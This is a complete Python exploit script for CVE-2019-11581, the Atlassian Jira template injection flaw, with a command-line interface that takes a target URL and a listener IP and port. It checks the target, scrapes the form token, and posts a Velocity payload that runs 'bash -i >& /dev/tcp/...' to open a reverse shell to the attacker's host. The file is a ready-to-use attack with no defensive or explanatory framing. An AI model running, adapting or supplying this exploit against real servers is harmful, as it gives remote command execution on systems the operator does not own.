import argparse
import requests
import sys
import lxml.html
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-11581
# Altassian Jira template injection vuln RCE
class CVE2019_11581:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, host, port):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/") + '/secure/ContactAdministrators!default.jspa'
        self.host, self.port = host, port
        self.session = requests.Session()

    # check if vuln or not
    def check_vuln(self):
        print (LogColors.BLUE + "check is vulnerable..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url, verify = False)
        except Exception:
            print (LogColors.RED + "failed to check vuln or not :(" + LogColors.ENDC)
            sys.exit()
        else:
            tree = lxml.html.fromstring(r.text)
            check = tree.xpath('.//div[@class="aui-message aui-message-warning warningd"]')
            if check:
                print (LogColors.RED + "not vulnerable :(" + LogColors.ENDC)
                sys.exit()
            else:
                print (LogColors.GREEN + "maybe vulnerable :)" + LogColors.ENDC)

    # get token
    def get_token(self):
        print (LogColors.BLUE + "get alt token..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url, verify = False)
        except Exception:
            print (LogColors.RED + "error while parse token :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                tree = lxml.html.fromstring(r.text)
                token = tree.xpath('.//*[@name="atl_token"]/@value')
                if token[0]:
                    self.token = token[0]
                    print (LogColors.YELLOW + self.token + LogColors.ENDC)
                    print (LogColors.YELLOW + "token parsed :)" + LogColors.ENDC)
                else:
                    print (LogColors.RED + "error parse token :(" + LogColors.ENDC)
            else:
                print (LogColors.RED + "error parse token :(" + LogColors.ENDC)
                sys.exit()

    # generate payload
    def get_payload(self):
        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
        payload = "$i18n.getClass().forName('java.lang.Runtime')."
        payload += "getMethod('getRuntime',null).invoke(null,null)."
        payload += "exec('bash -i >& /dev/tcp/{}/{} 0>&1').waitFor()".format(self.host, self.port)
        return payload
    
    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        payload = self.get_payload()
        data = (
            ('from','JIRA@JIRA.com'),
            ('subject', payload),
            ('details', payload),
            ('atl_token', self.token),
            ('Send','Send')
        )
        try:
            r = self.session.post(
                self.url.replace("!default.jspa", ".jspa"), 
                data = data, verify = False
            )
        except Exception:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.check_vuln()
        self.get_token()
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2019_11581(url, ip, port)
    cve.exploit()

